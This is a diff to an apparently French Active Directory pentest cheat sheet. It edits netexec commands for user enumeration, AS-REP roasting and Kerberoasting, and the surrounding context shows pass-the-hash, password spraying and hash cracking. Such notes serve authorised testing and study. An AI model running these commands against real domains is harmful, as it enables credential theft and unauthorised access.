@@ -24,7 +24,7 @@ nxc smb <DC-IP> -u <user> -p <pass>
 nxc smb <DC-IP> -u <user> -H <NTLM>              # Pass-the-Hash
 
 # Infos domaine de base
-nxc smb <DC-IP> -u <user> -p <pass> --users
+nxc smb <DC-IP> -u <user> -p <pass> --users | awk '$1=="SMB" {print $5}' | sort -u > users.txt
 nxc smb <DC-IP> -u <user> -p <pass> --groups
 nxc smb <DC-IP> -u <user> -p <pass> --pass-pol   # politique de mdp → lockout ?
 nxc smb <DC-IP> -u <user> -p <pass> --shares
@@ -32,7 +32,7 @@ nxc smb <DC-IP> -u <user> -p <pass> --rid-brute  # bruteforce RID → liste user
 
 # LDAP
 nxc ldap <DC-IP> -u <user> -p <pass> --query "(objectClass=user)" ""
-nxc ldap <DC-IP> -u <user> -p <pass> --users
+faketime "$(rdate -p -n <ip>)" nxc ldap <DC-IP> -u <user> -p <pass> --users | awk '$1=="LDAP" {print $5}' | sort -u > users.txt
 nxc ldap <DC-IP> -u <user> -p <pass> --groups
 
 # Enumération via rpcclient
@@ -143,7 +143,7 @@ GetNPUsers.py <domain>/ -usersfile users.txt -no-pass -dc-ip <DC-IP> -outputfile
 
 # Avec creds valides — trouve automatiquement les users vulnérables
 GetNPUsers.py <domain>/<user>:<pass> -request -dc-ip <DC-IP>
-nxc ldap <DC-IP> -u <user> -p <pass> --asreproast asrep.txt
+faketime "$(rdate -p -n <ip>)" nxc ldap <DC-IP> -u <user> -p <pass> --asreproast asrep.txt
 
 # Crack
 hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
@@ -154,7 +154,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt asrep.txt
 ### Password Spraying
 
 ```bash
-# ⚠️ Vérifier la politique de lockout AVANT : nxc smb <DC-IP> ... --pass-pol
+# Vérifier la politique de lockout AVANT : nxc smb <DC-IP> ... --pass-pol
 # Respecter le threshold (souvent 5 tentatives)
 
 nxc smb <DC-IP> -u users.txt -p <password> --continue-on-success
@@ -180,7 +180,7 @@ kerbrute passwordspray -d <domain> --dc <DC-IP> users.txt <password>
 ```bash
 # Lister les comptes Kerberoastables
 GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <DC-IP>
-nxc ldap <DC-IP> -u <user> -p <pass> --kerberoasting kerb.txt
+faketime "$(rdate -p -n <ip>)" nxc ldap <DC-IP> -u <user> -p <pass> --kerberoasting kerb.txt
 
 # Demander les tickets
 GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <DC-IP> -request
